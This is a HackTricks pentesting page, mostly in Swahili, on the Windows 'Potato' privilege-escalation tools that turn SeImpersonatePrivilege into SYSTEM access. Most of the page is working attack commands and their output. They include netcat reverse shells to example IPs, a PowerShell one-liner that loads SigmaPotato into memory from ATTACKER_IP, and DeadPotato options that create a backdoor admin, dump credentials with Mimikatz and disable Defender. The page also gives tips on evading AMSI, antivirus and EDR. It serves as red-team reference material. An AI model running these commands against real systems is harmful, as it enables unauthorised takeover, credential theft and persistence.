# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato haifanyi kazi** kwenye Windows Server 2019 na Windows 10 build 1809 na baadaye. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** zinaweza kutumika kupata ruhusa sawa na kupata upatikanaji wa ngazi ya `NT AUTHORITY\SYSTEM`. Chapisho hili la blogu (https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) linaelezea kwa undani zana ya `PrintSpoofer`, ambayo inaweza kutumika kuudhi impersonation privileges kwenye mashine za Windows 10 na Server 2019 ambapo JuicyPotato haifanyi kazi tena.

> [!TIP]
> Chaguo la kisasa linalotunzwa mara kwa mara mwaka 2024–2025 ni SigmaPotato (a fork of GodPotato) ambalo linaongeza matumizi ya in-memory/.NET reflection na msaada uliopanuliwa wa OS. Angalia matumizi ya haraka hapa chini na repo katika References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Mahitaji na matatizo ya kawaida

Mbinu zote zifuatazo zinategemea kutumia vibaya impersonation-capable privileged service kutoka muktadha unaoshikilia moja ya ruhusa hizi:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity haidiwi ikiwa token tayari ina SeImpersonatePrivilege (kawaida kwa akaunti nyingi za huduma kama IIS AppPool, MSSQL, n.k.)

Angalia ruhusa kwa haraka:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- Ikiwa shell yako inaendesha chini ya tokeni iliyorodheshwa bila SeImpersonatePrivilege (common for Local Service/Network Service in some contexts), rudisha ruhusa za kawaida za akaunti kwa kutumia FullPowers, kisha endesha Potato. Mfano: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer inahitaji huduma ya Print Spooler iendeshwe na iwe inapatikana kupitia local RPC endpoint (spoolss). Katika hardened environments where Spooler is disabled post-PrintNightmare, prefer RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato inahitaji OXID resolver inayoweza kufikiwa kwenye TCP/135. Ikiwa egress imezuiwa, tumia redirector/port-forwarder (see example below). Older builds needed the -f flag.
- EfsPotato/SharpEfsPotato hutumia MS-EFSR; ikiwa pipe moja imezuiwa, jaribu alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 during RpcBindingSetAuthInfo kwa kawaida inaonyesha unknown/unsupported RPC authentication service; jaribu pipe/transport tofauti au hakikisha target service inaendeshwa.
- “Kitchen-sink” forks such as DeadPotato zinajumuisha moduli za ziada za payload (Mimikatz/SharpHound/Defender off) ambazo huandika kwenye diski; tarajia utambuzi wa EDR kuwa mkubwa zaidi compared to the slim originals.

## Demo ya Haraka

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Vidokezo:
- Unaweza kutumia -i kuanzisha mchakato mwingiliano kwenye console ya sasa, au -c kuendesha one-liner.
- Inahitaji huduma ya Spooler. Ikiwa imezimwa, itashindwa.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Ikiwa outbound 135 imezuiwa, pivot the OXID resolver kupitia socat kwenye redirector yako:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato ni primitive mpya ya matumizi mabaya ya COM iliyotolewa mwishoni mwa 2022 inayolenga huduma ya **PrintNotify** badala ya Spooler/BITS. Binary inaunda PrintNotify COM server, inaingiza `IUnknown` bandia, kisha inasababisha callback yenye mamlaka kupitia `CreatePointerMoniker`. Wakati huduma ya PrintNotify (inayoendesha kama **SYSTEM**) inarudi kuungana, mchakato unakopia token iliyorejeshwa na kuzindua payload iliyotolewa kwa ruhusa kamili.

Key operational notes:

* Inafanya kazi kwenye Windows 10/11 na Windows Server 2012–2022 mradi tu Print Workflow/PrintNotify service imewekwa (ipo hata pale legacy Spooler ikiwa imezimwa baada ya PrintNightmare).
* Inahitaji muktadha unaoitisha kuwa na **SeImpersonatePrivilege** (kawaida kwa IIS APPPOOL, MSSQL, na akaunti za huduma za scheduled-task).
* Inakubali amri ya moja kwa moja au mode ya mwingiliano ili uweze kubaki ndani ya console ya awali. Mfano:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Kwa sababu inategemea COM tu, hakuna wasikilizi wa named-pipe au redirectors za nje zinazohitajika, ikifanya iwe mbadala rahisi kwenye mashine ambapo Defender anazuia RoguePotato’s RPC binding.

Operators kama Ink Dragon hutumia PrintNotifyPotato mara tu baada ya kupata ViewState RCE kwenye SharePoint ili kuhamia kutoka kwa mhudumu `w3wp.exe` kwenda SYSTEM kabla ya kusakinisha ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Kidokezo: Kama pipe moja itashindwa au EDR ikizuie, jaribu pipe nyingine zinazoungwa mkono:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Vidokezo:
- Inafanya kazi kwenye Windows 8/8.1–11 na Server 2012–2022 wakati SeImpersonatePrivilege ipo.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato inatoa matoleo mawili yanayolenga service DCOM objects ambazo kwa default zinatumia RPC_C_IMP_LEVEL_IMPERSONATE. Jenga au tumia binaries zilizotolewa na endesha amri yako:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (tawi la GodPotato lililoboreshwa)

SigmaPotato inaongeza vipengele vya kisasa kama in-memory execution kupitia .NET reflection na msaidizi wa PowerShell reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Manufaa ya ziada katika matoleo ya 2024–2025 (v1.2.x):
- Bendera ya reverse shell iliyojengewa ndani `--revshell` na kuondolewa kwa kikomo cha 1024-char cha PowerShell ili uweze kutuma payloads ndefu zinazopitisha AMSI kwa mara moja.
- Sintaksia rafiki kwa Reflection (`[SigmaPotato]::Main()`), pamoja na hila ya msingi ya kuepuka AV kupitia `VirtualAllocExNuma()` ili kupotosha heuristics rahisi.
- Tofauti `SigmaPotatoCore.exe` iliyotengenezwa kwa .NET 2.0 kwa mazingira ya PowerShell Core.

### DeadPotato (urekebishaji wa GodPotato wa 2024 wenye moduli)

DeadPotato inahifadhi mnyororo wa impersonation wa GodPotato OXID/DCOM lakini inaingiza wasaidizi wa post-exploitation ili operatori waweze kuchukua SYSTEM mara moja na kufanya persistence/collection bila zana za ziada.

Moduli za kawaida (vyote vinahitaji SeImpersonatePrivilege):

- `-cmd "<cmd>"` — spawn amri yoyote kama SYSTEM.
- `-rev <ip:port>` — quick reverse shell.
- `-newadmin user:pass` — unda admin wa ndani kwa persistence.
- `-mimi sam|lsa|all` — drop and run Mimikatz to dump credentials (huandika kwenye diski; inayoonekana sana).
- `-sharphound` — run SharpHound collection kama SYSTEM.
- `-defender off` — flip Defender real-time protection (inayoonekana sana).

Mifano ya one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Kwa kuwa inakuja na binaries za ziada, tarajia alama nyingi zaidi za AV/EDR; tumia GodPotato/SigmaPotato nyembamba wakati stealth inapotokea kuwa muhimu.

## Marejeo

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Rejesha ruhusa za token za chaguo-msingi kwa service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato hadi SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Kufichua Relay Network na jinsi inavyofanya kazi ndani ya operesheni ya shambulio yenye stealth](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
